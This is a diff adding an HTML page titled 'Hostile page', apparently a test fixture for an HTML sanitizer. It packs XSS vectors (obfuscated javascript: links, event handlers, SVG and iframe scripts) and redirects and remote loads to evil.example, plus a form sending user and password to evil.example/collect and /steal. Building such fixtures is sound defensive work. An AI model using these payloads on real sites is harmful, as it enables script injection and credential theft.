@@ -1,0 +1,40 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Hostile  page</title>
+<meta http-equiv="refresh" content="0; url=https://evil.example/refresh">
+<base href="https://evil.example/">
+<link rel="preload" href="https://evil.example/preload.js" as="script">
+<link rel="stylesheet" href="https://evil.example/style.css">
+<style>body { background: url(https://evil.example/bg.png) }</style>
+<script>window.HEAD_SCRIPT = 1</script>
+<script src="https://evil.example/remote.js"></script>
+</head>
+<body onload="window.BODY_ONLOAD = 1">
+<h1 id="SR" name="guest">Token service</h1>
+<p>Refresh tokens are <strong>rotated</strong> on every use.</p>
+<p><img src="img/arch.png" alt="Architecture" onerror="window.IMG_ONERROR = 1"></p>
+<p><a href="jav&#x09;ascript:window.ENTITY_JS = 1">entity link</a> <a href="javascript:window.PLAIN_JS = 1">plain js link</a>
+<a href="JaVaScRiPt:window.CASE_JS = 1">case link</a> <a href="  javascript:window.SPACE_JS = 1">space link</a>
+<a href="data:text/html,<script>window.DATA_JS=1</script>">data link</a> <a href="vbscript:msgbox(1)">vb link</a>
+<a href="details.html" onclick="window.CLICK = 1" onmouseover="window.HOVER = 1" style="color:red">details</a></p>
+<form action="https://evil.example/collect" method="post">
+<input type="text" name="user"><input type="password" name="pass">
+<button formaction="https://evil.example/steal">Send</button>
+<p>Text inside the form.</p>
+</form>
+<svg width="10" height="10"><script>window.SVG_SCRIPT = 1</script><a href="javascript:window.SVG_LINK=1"><text>svg link</text></a>
+<animate attributeName="href" values="javascript:window.ANIMATE=1"/></svg>
+<math><mi xlink:href="javascript:window.MATH=1">x</mi></math>
+<template><p>template text</p><script>window.TEMPLATE = 1</script></template>
+<iframe src="https://evil.example/frame" srcdoc="<script>window.SRCDOC=1</script>"></iframe>
+<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/y.swf">
+<noscript><img src="https://evil.example/pixel.gif"></noscript>
+<details open ontoggle="window.TOGGLE = 1"><summary>More</summary><p>Hidden part.</p></details>
+<p>&lt;script&gt;window.ESCAPED = 1&lt;/script&gt; stays text.</p>
+<video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"></video>
+<div style="position:fixed;inset:0" onclick="x()">Overlay text</div>
+<input type="checkbox" checked onclick="window.BOX=1"> a box
+</body>
+</html>
